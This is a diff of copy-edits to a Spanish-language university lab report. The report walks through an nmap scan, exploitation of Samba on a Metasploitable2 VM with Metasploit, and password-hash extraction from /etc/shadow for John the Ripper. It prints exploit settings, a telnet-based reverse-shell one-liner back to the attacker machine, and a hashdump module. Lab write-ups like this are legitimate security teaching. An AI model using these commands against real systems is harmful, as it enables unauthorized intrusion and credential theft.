@@ -17,7 +17,7 @@ qué tipos de filtros de paquetes...
 La herramienta "nmap" ofrece como salida un listado de los objetivos analizados, junto
 con una serie de información de dichos objetivos, dependiendo de las opciones seleccionadas.
 De toda la información obtenida, una de la más importante es la obtenida del puerto de cada
-uno de los servicios analizados. Dicha tabla de puertos indica mediante cuatros estados el
+uno de los servicios analizados. Dicha tabla de puertos indica, mediante cuatros estados, el
 modo en el que se encuentra el puerto en el momento del análisis (open, closed, filtered y
 unfiltered).
 
@@ -28,7 +28,7 @@ proseguimos con la ejecución del siguiente comando en la máquina "kali":
 
 Las opciones del comando hacen lo siguiente:
 	-p: indica el intervalo de puertos del objetivo a analizar (1-65535).
-	-T: selecciona la plantilla del temportizada (4 es de los más rápidos).
+	-T: selecciona la plantilla de temporizado (4 es de los más rápidos).
 	-A: habilita la detección del sistema operativo y versión.
 	-v: aumenta el nivel de mensajes detallados en la salida.
 	192.168.10.11: dirección del objetivo a analizar.
@@ -56,7 +56,7 @@ Parte II: Inyección remota de comandos en el sistema de ficheros remotos Samba.
 
 En primer lugar, para realizar esta segunda parte de la práctica, se buscó información sobre
 la herramienta "Metasploit Framework" para saber qué íbamos a utilizar. "Metasploit Framework"
-es un subproyecto de "Metasplit" cuya función principal es desarrollar y ejecutar exploits
+es un subproyecto de "Metasploit”, cuya función principal es desarrollar y ejecutar exploits
 contra una máquina remota. La nueva herramienta se va a utilizar en esta parte de la práctica
 para explotar y penetrar en las vulnerabilidades del objetivo analizado mediante "nmap" en el
 punto anterior. La herramienta funciona a base de módulos, cada uno de ellos aprovechan distintas
@@ -77,21 +77,21 @@ siguiente comando:
 
 Como resultado, se obtiene una lista con una serie de payloads, con información referente a ellos
 como su nombre, una breve descripción y un ranking. De todos los payload disponibles, seleccionamos
-en la máquina kali el siguiente:
+en la máquina “kali” el siguiente:
 
 	set payload cmd/unix/reverse
 
-Ya se han seleccionado tanto el módulo para transportar el payload, como dicho código malicioso,
+Ya se han seleccionado, tanto el módulo para transportar el payload, como dicho código malicioso,
 así que ya sólo queda fijar los parámetros del puerto y direcciones de la máquina a comprometer.
 Así pues, se fijan los parámetros con los siguientes comandos y finalmente, se ejecuta el exploit:
 
 	set RHOST 192.168.10.11			(máquina destino)
-	set RPORT 445					(puerto)
+	set RPORT 445				(puerto)
 	set LHOST 192.168.10.10 		(máquina origen)
 	exploit
 
 Al ejecutar el exploit, en un principio, y si todo ha ido bien, se debería haber establecido una
-conexión telnet con la máquina metasploitable2. Para comprobarlo se ejecutarón los siguientes
+conexión telnet con la máquina "metasploitable2". Para comprobarlo se ejecutarón los siguientes
 comandos (terminal kali en la que se ha accedido a metasploitable2 y en otra distinta):
 
 					--------------------------------------------------------------------------------
@@ -137,26 +137,25 @@ ejecutando el siguiente comando:
 	sh –c (sleep 4197|telnet 192.168.10.10 4444|while : ; do sh && break;
 						 done 2>&1|telnet 192.168.10.10 4444 >/dev/null 2>&1 &)
 
-/******************
 El comando se ejecuta en segundo plano, y consiste en un bucle encargado de redirigir toda la 
 información obtenida de la conexión a un fichero, tanto la salida estándar, como la salida de error.
 El propósito principal es que no aparezca por pantalla ninguna información de que se ha establecido
 una conexión y se ha podido acceder a la máquina remotamente.
-************/
+
 
 Parte III: Crackear contraseñas con John the Ripper
 -----------------------------------------------------------------------------------------------------
 
 En este tercer apartado de la práctica, se va a intentar obtener la contraseña del usuario "msfadmin"
-de la máquina metasploitable2. Para ello, en primer lugar, se va a cambiar la contraseña del usuario
+de la máquina "metasploitable2". Para ello, en primer lugar, se va a cambiar la contraseña del usuario
 por una palabra en inglés (en nuestro caso "computer"). Ahora, se procede a pasar la sesión abierta
-en el apartado 2 en la máquina kali a segundo plano(aquella en la que se había accedido a la máquina
-comprometida). Esto se consigue con el pulsando simultáneamente "<Ctrl> y Z", y comprobando si se ha
-realizado correctamente mostrando las sesiones abiertas con "session -l".
+en el apartado 2 en la máquina "kali" a segundo plano(aquella en la que se había accedido a la máquina
+comprometida). Ésto se consigue pulsando simultáneamente "<Ctrl> y Z", y comprobando si se ha realizado
+correctamente mostrando las sesiones abiertas con "session -l".
 
-A continuación se escoge un nuevo módulo, en este caso, para obtener los
-hashes de las contraseñas contenidas en /etc/shadow de la máquina comprometida. El procedimiento es
-análogo al del apartado anterior, pero eligiendo el módulo correspondiente:
+A continuación se escoge un nuevo módulo, en este caso, para obtener los hashes de las contraseñas
+contenidas en /etc/shadow de la máquina comprometida. El procedimiento es análogo al del apartado
+anterior, pero eligiendo el módulo correspondiente:
 
 	use post/linux/gather/hashdump			(selecciona el módulo)
 	show options							(muestra las opciones)
